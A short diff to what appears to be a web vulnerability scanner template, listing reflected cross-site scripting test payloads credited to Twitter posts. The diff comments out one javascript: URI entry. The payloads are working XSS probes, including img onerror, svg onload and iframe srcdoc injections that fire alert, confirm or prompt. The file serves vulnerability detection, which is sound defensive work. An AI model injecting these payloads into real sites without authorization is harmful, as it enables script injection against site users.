@@ -22,7 +22,7 @@ http:
         - "<img src=x onerror=confirm(1)>"    #custom
         - '"><img src=x onerror=alert(document.domain)>'    #https://twitter.com/abdlah_md/status/1558003867568291844
         - '<iframe srcdoc="<img src=x onerror=alert(999)>"></iframe>'   #https://twitter.com/gonzxph/status/1656445477783748608
-        - 'javascript:alert(1)'   #https://twitter.com/mamunwhh/status/1590028838800883713
+        # - 'javascript:alert(1)'   #https://twitter.com/mamunwhh/status/1590028838800883713
         - '"><svg onload=prompt(document.domain)>'    #https://twitter.com/kab33rrr/status/1524464126608560128
         - '"/><svg/onload=confirm(/xxs/)>'    #https://twitter.com/Manorr07/status/1564280686000934920
         - '"><img src=x onerror=prompt(1);>'    #https://twitter.com/abdlah_md/status/1559332579802812424
